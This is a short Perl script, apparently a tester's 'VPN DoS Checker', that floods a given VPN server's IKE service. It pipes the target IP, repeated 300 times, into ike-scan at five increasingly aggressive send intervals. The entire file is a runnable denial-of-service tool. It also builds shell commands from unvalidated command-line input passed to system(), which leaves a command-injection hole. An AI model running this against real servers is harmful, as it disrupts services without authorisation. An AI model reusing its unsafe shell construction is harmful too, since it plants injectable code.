#!/usr/bin/perl
# VPN DoS checks
# by Tengku Zahasman

use strict;
use warnings;
use Getopt::Long;
use File::Basename;

my $basename = basename($0);

my $help = 0;

# usage information 
sub show_help {
	print <<HELP;
****************************************
VPN DoS Checker - by TZ

To do DoS testing on VPN servers
****************************************

This should be run in a test script, then run vpn-dos-format.pl 

Usage: ./$basename <ip address> <transform>

Quick Ref: perl -e 'print "xxx.xxx.xxx.xxx\\n" x300' | ike-scan -f - -r 1 -i 1000
	
HELP
	exit 1;
}

GetOptions(
	'h'	  => \$help,
) or show_help;

$help and show_help;

# what's the ip?
my $ip = $ARGV[0];
!defined($ip) and show_help;

# what's the transform? (if any)
my $trans = "";
if (defined($ARGV[1])) {
	$trans = "--trans=".$ARGV[1];
}

sub dosit() {
	print ("Command: perl -e 'print \"".$ip."\\n\" x300' | ike-scan ". $trans ." -f - -r 1 -i 1000\n");
	system ("perl -e 'print \"".$ip."\\n\" x300' | ike-scan ". $trans ." -f - -r 1 -i 1000");
	
	print ("Command: perl -e 'print \"".$ip."\\n\" x300' | ike-scan ". $trans ." -f - -r 1 -i 500\n");
	system ("perl -e 'print \"".$ip."\\n\" x300' | ike-scan ". $trans ." -f - -r 1 -i 500");
	
	print ("Command: perl -e 'print \"".$ip."\\n\" x300' | ike-scan ". $trans ." -f - -r 1 -i 250\n");
	system ("perl -e 'print \"".$ip."\\n\" x300' | ike-scan ". $trans ." -f - -r 1 -i 250");
	
	print ("Command: perl -e 'print \"".$ip."\\n\" x300' | ike-scan ". $trans ." -f - -r 1 -i 200\n");
	system ("perl -e 'print \"".$ip."\\n\" x300' | ike-scan ". $trans ." -f - -r 1 -i 200");
	
	print ("Command: perl -e 'print \"".$ip."\\n\" x300' | ike-scan ". $trans ." -f - -r 1 -i 100\n");
	system ("perl -e 'print \"".$ip."\\n\" x300' | ike-scan ". $trans ." -f - -r 1 -i 100");
}

dosit();
